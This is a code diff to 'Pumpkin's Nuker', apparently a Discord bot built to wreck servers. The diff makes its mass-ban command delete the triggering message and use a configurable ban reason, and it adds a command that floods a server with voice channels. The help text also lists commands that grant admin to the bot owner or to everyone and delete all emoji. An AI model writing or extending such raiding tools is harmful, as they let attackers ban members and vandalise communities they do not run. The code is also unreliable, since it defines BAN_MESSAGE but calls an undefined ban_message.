@@ -20,6 +20,7 @@ SPAM_ROLES_NAME = config['spam_roles_name']
 OWNER_ID = config['owner_id']
 NUM_CHANNELS = config['num_channels']
 NUM_ROLES = config['num_roles']
+BAN_MESSAGE = config['ban_message']
 
 
 @bot.event
@@ -271,14 +272,47 @@ async def getadmin(ctx):
 @bot.command(name="2")
 @is_owner()
 async def massban(ctx):
+    await ctx.message.delete()
     for user in ctx.guild.members:
         try:
-            await user.ban(reason="Mass ban")
+            await user.ban(reason=ban_message)
             print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f"Banned user: {user.name}")
         except discord.Forbidden:
             print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"Missing Permissions to ban user: {user.name}")
         except discord.HTTPException as e:
             print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"An error occurred while banning user {user.name}: {e}")
+            
+            
+@bot.command(name="6")
+@is_owner()
+async def massvc(ctx):
+    try:
+        await ctx.message.delete()
+
+        with open('config.json') as config_file:
+            config = json.load(config_file)
+        
+        vc_names = config.get("voice_channel_names", [])
+        num_voice_channels = config.get("num_voice_channels", 0)
+
+        if not vc_names:
+            print("No voice channel names found in config.")
+            return
+
+        if num_voice_channels <= 0:
+            print("Invalid number of voice channels to create.")
+            return
+
+        for _ in range(num_voice_channels):
+            vc_name = random.choice(vc_names)
+            await ctx.guild.create_voice_channel(name=vc_name)
+            print(f"Created voice channel: {vc_name}")
+
+        print(f"Created {num_voice_channels} voice channels in {ctx.guild.name}")
+
+    except Exception as e:
+        print(f"Error creating voice channels in {ctx.guild.name}: {e}")
+        
             
 
 @bot.command()
@@ -292,6 +326,7 @@ async def cmd(ctx):
     embed.add_field(name='!3', value='give an admin role to the owner of the bot', inline=False)
     embed.add_field(name='!4', value='deletes all emoji in the server', inline=False)
     embed.add_field(name='!5', value='give administrator perm to everyone', inline=False)
+    embed.add_field(name='!6', value='mass create vcs', inline=False)
     embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/kinxyz/Pumpkin-Nuker", inline=False)
   
     await ctx.author.send(embed=embed)
